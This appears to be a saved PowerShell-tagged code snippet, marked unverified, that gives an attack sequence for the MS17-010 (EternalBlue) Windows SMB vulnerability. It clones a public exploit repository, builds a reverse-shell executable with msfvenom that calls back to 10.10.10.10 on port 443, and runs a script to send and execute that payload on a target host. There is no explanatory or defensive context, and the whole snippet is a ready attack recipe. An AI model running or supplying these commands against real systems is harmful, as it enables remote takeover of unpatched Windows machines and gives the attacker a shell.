---
id: 84c751cf-b26d-4cfa-8c78-d04cfeadf4bc
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:30.526948+00:00'
updated_at: '2023-04-10T20:37:48.224632+00:00'
---

# Code Snippet 84c751cf

**Language**: Powershell

```powershell
git clone https://github.com/helviojunior/MS17-010

# generate a simple reverse shell to use
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
python2 send_and_execute.py 10.0.0.1 revshell.exe
```


